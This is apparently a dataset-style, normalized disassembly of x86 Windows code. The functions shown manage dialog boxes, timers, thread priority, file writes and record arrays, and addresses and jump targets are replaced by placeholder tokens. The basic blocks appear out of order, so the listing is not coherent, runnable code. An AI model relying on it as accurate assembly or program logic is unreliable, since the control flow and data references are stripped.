cmp [ ebp - 0x58 ] 0xe1ff
jne r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + esi + 0x20 ]
push 0x1
push 0x0
push edx
push 0x0
push eax
push 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
inc [ eax + 0x4 ]
mov edx [ ebp - 0x4c ]
push 0x0
lea ecx [ ebp - 0x10c ]
push ecx
push edx
call [ LocalSize@IAT ]
push eax
mov eax [ ebp - 0x4c ]
push eax
push esi
call [ WriteFile@IAT ]
push esi
mov [ ebp + 0x8 ] eax
call [ CloseHandle@IAT ]
jmp r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ eax + esi + 0x20 ]
push ecx
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push edx
push 0x0
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea ecx [ ebp - 0x40 ]
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] 0x0
mov edx [ ecx ]
push eax
call [ edx + 0x18 ]
mov eax [ ebp - 0x58 ]
test ax ax
jbe r-xdata
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp + 0x8 ]
call sub_401020
jmp r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
movzx eax ax
xor ecx ecx
mov ch al
shr eax 0x8
or ecx eax
sub ecx 0x2
mov esi ecx
push esi
mov [ ebp - 0x28 ] esi
call sub_4b66db
mov ebx eax
add esp 0x4
test ebx ebx
mov [ ebp - 0x54 ] ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push esi
push ebx
call [ edx + 0x18 ]
sub_44bcf0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c06ab
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x238
cmp eax 0x111
push ebx
push esi
push edi
ja r-xdata
cmp eax 0x113
je r-xdata
je r-xdata
mov esi [ esp + 0x254 ]
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
mov edi eax
call [ GetTickCount@IAT ]
mov edx eax
sub edx [ edi + 0xc ]
mov eax 0x10624dd3
mul edx
mov ecx edx
shr ecx 0x6
mov eax 0x88888889
mul ecx
shr edx 0x5
mov eax edx
imul eax eax 0x3c
sub ecx eax
push ecx
push edx
lea ecx [ esp + 0x4c ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
push 0x100
lea edx [ esp + 0x148 ]
push edx
push 0xdd0
push esi
call [ GetDlgItemTextA@IAT ]
lea eax [ esp + 0x144 ]
push eax
lea ecx [ esp + 0x48 ]
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
cmp eax 0x1802
jne r-xdata
mov ecx [ esp + 0x25c ]
movzx eax cx
sub eax 0x2
je r-xdata
cmp eax 0x10
je r-xdata
mov eax 0x1
lea edx [ esp + 0x44 ]
push edx
push 0xdd0
push esi
call [ SetDlgItemTextA@IAT ]
xor eax eax
jmp r-xdata
mov esi [ esp + 0x254 ]
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
mov edi eax
mov edx [ edi ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ edi ]
push eax
call [ CloseHandle@IAT ]
push 0x1
push esi
call [ KillTimer@IAT ]
xor ebx ebx
push ebx
push ebx
push 0x147
push 0xdd4
push esi
call [ SendDlgItemMessageA@IAT ]
push rw-data
push esi
mov [ rw-data ] eax
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x25c ]
push ecx
push esi
call [ EndDialog@IAT ]
jmp r-xdata
mov esi [ esp + 0x254 ]
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
push r--data
push esi
mov edi eax
call [ SetWindowTextA@IAT ]
push 0x0
push esi
mov [ edi + 0x8 ] 0x1
call [ EnableWindow@IAT ]
jmp r-xdata
sub eax 0x4eb
je r-xdata
mov eax [ esp + 0x254 ]
push 0x4
push r--data
push r--data
push eax
call [ MessageBoxA@IAT ]
cmp eax 0x6
jne r-xdata
cmp eax 0x110
jne r-xdata
mov ecx [ esp + 0x244 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x244
retn 0x10
mov esi [ esp + 0x254 ]
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
mov cl [ eax + 0x30 ]
xor ebx ebx
cmp cl bl
je r-xdata
sub eax 0x8e7
jne r-xdata
mov edi [ esp + 0x254 ]
push ebp
mov ebp [ esp + 0x264 ]
push ebp
push 0xffffffeb
push edi
call [ SetWindowLongA@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov esi [ SetWindowPos@IAT ]
sub ecx eax
xor ebx ebx
test ecx ecx
jle r-xdata
push r--data
push 0x4ed
push esi
mov [ eax + 0x30 ] 0x1
call [ GetDlgItem@IAT ]
push eax
call [ SetWindowTextA@IAT ]
mov ecx [ rw-data ]
push ebx
push ecx
call [ ShowWindow@IAT ]
jmp r-xdata
push r--data
push 0x4ed
push esi
mov [ eax + 0x30 ] bl
call [ GetDlgItem@IAT ]
push eax
call [ SetWindowTextA@IAT ]
mov eax [ rw-data ]
push 0x5
push eax
call [ ShowWindow@IAT ]
jmp r-xdata
shr ecx 0x10
cmp ecx 0x1
jne r-xdata
cmp [ ebp + 0x2c ] ebx
jl r-xdata
mov edx [ rw-data ]
push 0x5
push ebx
push ebx
push edx
push eax
push ebx
push edi
call esi
mov edi [ esp + 0x254 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
xor ebx ebx
push ebx
push ebx
push 0x147
push 0xdd4
push edi
mov esi eax
call [ SendDlgItemMessageA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push edi
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x1c ]
mov ebp [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
push 0x6
sub ecx ebp
push ecx
sub edx [ esp + 0x18 ]
add edx 0x12c
push edx
push ebx
push ebx
push ebx
push edi
call esi
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
push 0x44
push 0x8c
push 0x122
push 0x8
sub eax edx
push eax
push ebx
push 0x1040
push edi
call [ GetDlgItem@IAT ]
push eax
call esi
xor ebp ebp
mov [ esp + 0x24 ] ebx
nop
mov edx [ esi ]
mov [ esp + 0xc ] 0x2
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] 0xffffffff
mov [ esp + 0x1c ] 0xfffffff1
mov ecx [ esp + eax * 4 + 0xc ]
push ecx
push edx
call [ SetThreadPriority@IAT ]
jmp r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov edx [ esp + esi * 4 + 0x10 ]
push edx
push ebx
push 0x143
push 0xdd4
push edi
call [ SendDlgItemMessageA@IAT ]
inc esi
cmp esi 0x5
jb r-xdata
mov eax [ rw-data ]
push ebx
push eax
push 0x14e
push 0xdd4
push edi
call [ SendDlgItemMessageA@IAT ]
mov esi [ esp + 0x264 ]
mov [ esi + 0x8 ] bl
mov [ esi + 0x4 ] edi
call [ GetTickCount@IAT ]
lea ecx [ esp + 0x44 ]
push ecx
push ebx
push esi
push sub_44a2a0
push ebx
push ebx
mov [ esi + 0xc ] eax
call sub_4b638f
add esp 0x18
cmp eax ebx
mov [ esi ] eax
jne r-xdata
movzx ecx ax
shl ecx 0x10
push ecx
push ebx
push 0x401
push 0xdd1
push edi
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
push eax
call ebp
push 0x640000
push ebx
push 0x401
push 0xdd2
push edi
call [ GetDlgItem@IAT ]
push eax
call ebp
mov [ esp + 0x10 ] r--data
mov [ esp + 0x14 ] r--data
mov [ esp + 0x18 ] r--data
mov [ esp + 0x1c ] r--data
mov [ esp + 0x20 ] r--data
xor esi esi
mov edx [ esp + 0x264 ]
mov eax [ edx + 0x2c ]
push ebx
push eax
push 0x186
push 0x1040
push edi
call [ SendDlgItemMessageA@IAT ]
mov edx [ esp + 0x24 ]
mov eax [ edx + esi ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx 0x10
jb r-xdata
cmp ebp edx
jge r-xdata
mov edx [ rw-data ]
mov ecx [ esi ]
mov [ esp + 0x10 ] 0x2
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] 0xffffffff
mov [ esp + 0x20 ] 0xfffffff1
mov eax [ esp + edx * 4 + 0x10 ]
push eax
push ecx
call [ SetThreadPriority@IAT ]
push ebx
push 0x64
push 0x1
push edi
call [ SetTimer@IAT ]
mov al [ esi + 0x30 ]
push ebx
push 0x4ed
cmp al bl
push 0x111
sete dl
push edi
mov [ esi + 0x30 ] dl
call ebp
pop ebp
jmp r-xdata
push 0xffffffff
push edi
call [ EndDialog@IAT ]
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
push esi
call sub_457f40
add esp 0x4
add esi eax
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x3c ] ebx
mov [ esp + 0x2c ] bl
mov eax [ esp + 0x264 ]
mov eax [ eax + 0x2c ]
cmp ebp eax
mov [ esp + 0x250 ] ebx
jge r-xdata
cmp ebp eax
jle r-xdata
push r--data
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x30 ]
call sub_401e80
jmp r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0x2c ]
call sub_402510
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x30 ]
call sub_401cc0
mov eax [ esp + 0x40 ]
mov esi 0x10
cmp eax esi
mov eax [ esp + 0x2c ]
jae r-xdata
push eax
push ebx
push 0x180
push 0x1040
push edi
call [ SendDlgItemMessageA@IAT ]
cmp [ esp + 0x40 ] esi
mov [ esp + 0x250 ] 0xffffffff
jb r-xdata
lea eax [ esp + 0x2c ]
mov eax [ esp + 0x24 ]
inc ebp
add eax 0x20c
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x3c ] ebx
mov [ esp + 0x2c ] bl
mov [ esp + 0x24 ] eax
jmp r-xdata
mov ecx [ esp + 0x2c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov esi [ rw-data ]
cmp esi ebx
jne r-xdata
sub_44c320
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_449f50
add esp 0x14
mov eax esi
pop esi
retn
sub_44c360
push ebp
mov ebp esp
push 0xffffffff
push sub_4c06d1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0xc ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
dec edi
add esi 0x20c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx esi
call sub_449810
cmp edi ebx
jbe r-xdata
sub_44c3b9
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_449110
add esi 0x20c
cmp esi edi
jne r-xdata
sub_44c3f0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_449fa0
add esp 0x14
retn 0xc
sub_44c420
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov edi edi
mov ecx esi
call sub_449110
add esi 0x20c
cmp esi edi
jne r-xdata
sub_44c450
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_44c360
mov eax esi
imul eax eax 0x20c
add esp 0x14
add eax edi
pop edi
pop esi
retn 0xc
sub_44c480
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0xc ] 0x0
pop ebx
retn
push edi
mov edi [ ebx + 0x8 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov ecx esi
call sub_449110
add esi 0x20c
cmp esi edi
jne r-xdata
sub_44c4d0
mov edx [ esp + 0xc ]
push ebx
push ebp
mov ebp ecx
mov ecx [ esp + 0x10 ]
cmp ecx edx
push esi
push edi
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
pop ebx
retn 0xc
mov esi [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
push esi
push ecx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_449f10
mov ebx [ ebp + 0x8 ]
mov esi eax
add esp 0x10
cmp esi ebx
mov edi esi
je r-xdata
mov ecx [ esp + 0x18 ]
mov [ ebp + 0x8 ] esi
mov ecx edi
call sub_449110
add edi 0x20c
cmp edi ebx
jne r-xdata
sub_44c530
push ebp
mov ebp esp
push 0xffffffff
push sub_4c06eb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x218
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push eax
lea ecx [ ebp - 0x224 ]
mov [ ebp - 0x14 ] esi
call sub_449810
mov ecx [ esi + 0x4 ]
xor edi edi
cmp ecx edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov edx [ esi + 0xc ]
sub edx ecx
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
mov edi edx
lea ecx [ ebp - 0x224 ]
call sub_449110
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ecx ecx
jne r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_4481a0
mov eax 0x7d1196
sub eax edx
cmp eax ebx
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov edx ecx
sub edx edi
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
cmp edx ebx
mov [ ebp + 0x10 ] ecx
jae r-xdata
mov eax edi
shr eax 0x1
mov edx 0x7d1196
sub edx eax
cmp edx edi
jae r-xdata
add edx ebx
cmp edi edx
jae r-xdata
push ecx
imul ebx ebx 0x20c
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
sub ecx ebx
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx esi
call sub_44c3f0
mov edx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
mov [ ebp + 0xc ] esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] edi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_44c320
add esp 0x10
lea ecx [ ebp - 0x224 ]
push ecx
push ecx
mov eax esp
add ebx edi
mov [ eax ] ebx
mov eax ebx
imul eax eax 0x20c
mov [ ebp + 0x10 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_44c3f0
mov ecx [ esi + 0x8 ]
lea edx [ ebp - 0x224 ]
push edx
mov edx ecx
sub edx edi
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
sub ebx edx
push ebx
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_44c450
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x224 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add edi eax
xor edi edi
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0x8 ] esp
call sub_449ee0
add esp 0xc
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
imul edi edi 0x20c
push edi
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov [ ebp + 0xc ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x1
mov [ eax ] ecx
call sub_449fa0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x224 ]
push edx
push ebx
push eax
mov [ ebp + 0xc ] eax
call sub_44c360
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax ebx
imul eax eax 0x20c
add esp 0x14
add ecx eax
mov eax [ esi + 0x8 ]
push edx
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_449fa0
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
mov ecx esi
call sub_447de0
mov edi eax
add edi ebx
add edx ebx
cmp edi edx
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
imul ebx ebx 0x20c
add edi eax
add ebx eax
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
push edx
push ecx
mov ecx esi
call sub_44c420
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
add ebx edx
test ecx ecx
je r-xdata
sub_44c890
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0708
push eax
mov [ fs : 0x0 ] esp
push ebx
push esi
push edi
mov edi [ ecx + 0x4 ]
test edi edi
mov [ esp + 0x14 ] 0x0
jne r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test edi edi
je r-xdata
test edi edi
jne r-xdata
mov esi [ esp + 0x1c ]
cmp edx esi
jae r-xdata
lea ecx [ esp + 0x20 ]
call sub_449110
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x210
mov ebx [ ecx + 0x8 ]
mov edx ebx
sub edx edi
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
cmp esi edx
jae r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x3e88cb3d
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
imul esi esi 0x20c
push ecx
mov eax esp
mov [ esp + 0x20 ] esp
mov [ eax ] ebx
mov eax [ ecx + 0x4 ]
push ecx
mov edx esp
add esi eax
mov [ edx ] esi
lea edx [ esp + 0x24 ]
mov [ esp + 0x24 ] esp
push edx
call sub_44c4d0
lea eax [ esp + 0x20 ]
push eax
sub esi edx
mov edx [ ecx + 0x8 ]
push esi
push ecx
mov eax esp
mov [ esp + 0x28 ] esp
mov [ eax ] edx
call sub_44c530
jmp r-xdata
sub_44c980
push ecx
push esi
sub esp 0x20c
mov esi ecx
mov ecx esp
mov [ esp + 0x210 ] esp
call sub_449080
mov eax [ esp + 0x218 ]
push eax
mov ecx esi
call sub_44c890
pop esi
pop ecx
retn 0x4
sub_44c9b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0728
push eax
mov [ fs : 0x0 ] esp
push ebx
push esi
push edi
mov edi [ rw-data ]
test edi edi
mov [ esp + 0x14 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x3c ]
imul esi esi 0x20c
push 0xffffffff
add esi edi
push 0x0
lea edx [ esp + 0x28 ]
mov [ esi ] ecx
push edx
lea ecx [ esi + 0x4 ]
call sub_401dd0
push rw-data
lea ecx [ esi + 0x20 ]
call sub_4495e0
mov al [ rw-data ]
mov [ esi + 0x30 ] al
mov ecx [ rw-data ]
push 0x1
lea edx [ esi + 0x38 ]
mov [ esi + 0x34 ] ecx
mov eax [ rw-data ]
push edx
push eax
call sub_4135e0
add esp 0xc
push rw-data
lea ecx [ esi + 0x54 ]
push ecx
call [ lstrcpyA@IAT ]
mov edx [ rw-data ]
mov [ esi + 0x158 ] edx
mov eax [ rw-data ]
mov [ esi + 0x15c ] eax
mov ecx [ rw-data ]
mov [ esi + 0x160 ] ecx
mov edx [ rw-data ]
mov [ esi + 0x164 ] edx
mov eax [ rw-data ]
mov [ esi + 0x168 ] eax
mov ecx [ rw-data ]
mov [ esi + 0x16c ] ecx
mov edx [ rw-data ]
mov [ esi + 0x170 ] edx
mov eax [ rw-data ]
mov [ esi + 0x174 ] eax
mov ecx [ rw-data ]
mov [ esi + 0x178 ] ecx
mov edx [ rw-data ]
mov [ esi + 0x17c ] edx
mov eax [ rw-data ]
mov [ esi + 0x180 ] eax
mov ecx [ rw-data ]
mov [ esi + 0x184 ] ecx
mov edx [ rw-data ]
push 0xffffffff
mov [ esi + 0x188 ] edx
mov eax [ rw-data ]
push 0x0
push rw-data
lea ecx [ esi + 0x190 ]
mov [ esi + 0x18c ] eax
call sub_401dd0
push 0xffffffff
push 0x0
push rw-data
lea ecx [ esi + 0x1ac ]
call sub_401dd0
push 0xffffffff
push 0x0
push rw-data
lea ecx [ esi + 0x1c8 ]
call sub_401dd0
push 0xffffffff
push 0x0
push rw-data
lea ecx [ esi + 0x1e4 ]
call sub_401dd0
mov ecx [ rw-data ]
mov [ esi + 0x200 ] ecx
mov dl [ rw-data ]
mov [ esi + 0x204 ] dl
mov al [ rw-data ]
mov [ esi + 0x205 ] al
mov cl [ rw-data ]
mov [ esi + 0x206 ] cl
mov dl [ rw-data ]
mov [ esi + 0x207 ] dl
mov al [ rw-data ]
mov [ esi + 0x208 ] al
mov cl [ rw-data ]
mov [ esi + 0x209 ] cl
mov dl [ rw-data ]
mov [ esi + 0x20a ] dl
cmp [ esp + 0x38 ] 0x10
jb r-xdata
sub esp 0x20c
mov ecx esp
mov [ esp + 0x228 ] esp
call sub_449080
push ebx
mov ecx rw-data
call sub_44c890
mov edi [ rw-data ]
mov esi [ esp + 0x1c ]
lea ebx [ esi + 0x1 ]
cmp edx ebx
jge r-xdata
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn
mov eax [ esp + 0x24 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_44cc00
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0761
push eax
mov al [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x368
push ebx
push ebp
push esi
xor ebx ebx
test al 0x1
push edi
mov esi 0xf
jne r-xdata
test [ rw-data ] 0x2
jne r-xdata
mov edx [ rw-data ]
or edx 0x1
push sub_4c2bf0
mov [ rw-data ] edx
mov [ rw-data ] esi
mov [ rw-data ] ebx
mov [ rw-data ] bl
call sub_4b6619
add esp 0x4
mov eax [ esp + 0x38c ]
cmp eax 0x111
ja r-xdata
mov edx [ rw-data ]
or edx 0x2
push sub_4c2bc0
mov [ rw-data ] edx
mov [ rw-data ] esi
mov [ rw-data ] ebx
mov [ rw-data ] 0x0
call sub_4b6619
add esp 0x4
cmp eax 0x114
je r-xdata
je r-xdata
mov edi [ esp + 0x388 ]
mov ebp [ GetDlgItem@IAT ]
push 0xfa2
push edi
call ebp
mov esi [ esp + 0x394 ]
cmp esi eax
je r-xdata
cmp eax 0x1402
jne r-xdata
mov ecx [ esp + 0x390 ]
movzx eax cx
cmp eax 0x1021
jg r-xdata
cmp eax 0x4e
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push 0x2
push esi
mov [ esp + 0x1c ] 0x1c
mov [ esp + 0x20 ] 0x5
call [ GetScrollInfo@IAT ]
mov ecx [ esp + 0x1c ]
mov eax 0x66666667
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
cmp edx 0x1
jg r-xdata
push 0xff3
push edi
call ebp
cmp esi eax
jne r-xdata
xor eax eax
mov esi [ esp + 0x388 ]
mov edi [ GetParent@IAT ]
lea eax [ esp + 0x170 ]
push eax
push 0x104
push 0x465
push esi
call edi
mov ebp [ SendMessageA@IAT ]
push eax
call ebp
lea eax [ esp + 0x170 ]
lea edx [ eax + 0x1 ]
sub eax 0x1036
cmp eax 0xa
ja r-xdata
je r-xdata
mov eax [ esp + 0x394 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0xfffffda2
jne r-xdata
cmp eax 0x110
jne r-xdata
mov ebx [ esp + 0x390 ]
movzx eax bx
cmp eax 0x7
mov [ esp + 0x14 ] 0x4
ja r-xdata
mov edx 0x2
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x174 ]
push ecx
mov ecx rw-data
call sub_401e80
lea edx [ esp + 0x6c ]
push edx
push 0x104
push 0x464
push esi
call edi
push eax
call ebp
lea eax [ esp + 0x6c ]
lea ecx [ eax + 0x1 ]
nop
movzx eax [ eax + lookup_table_44e8cc ]
jmp [ eax * 4 + jump_table_44e8b4 ]
mov esi [ esp + 0x388 ]
push 0x1021
push esi
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
sub eax 0x40e
cmp eax 0x7
ja r-xdata
cmp ecx 0xfffffda1
jne r-xdata
mov esi [ esp + 0x388 ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x40e
push esi
call edi
dec eax
neg eax
sbb al al
push 0x411
inc al
push esi
mov [ rw-data ] al
call edi
dec eax
neg eax
sbb al al
push 0x412
inc al
push esi
mov [ rw-data ] al
call edi
dec eax
neg eax
sbb al al
push 0x413
inc al
push esi
mov [ rw-data ] al
call edi
dec eax
neg eax
sbb al al
push 0x414
inc al
push esi
mov [ rw-data ] al
call edi
dec eax
neg eax
sbb al al
push 0x415
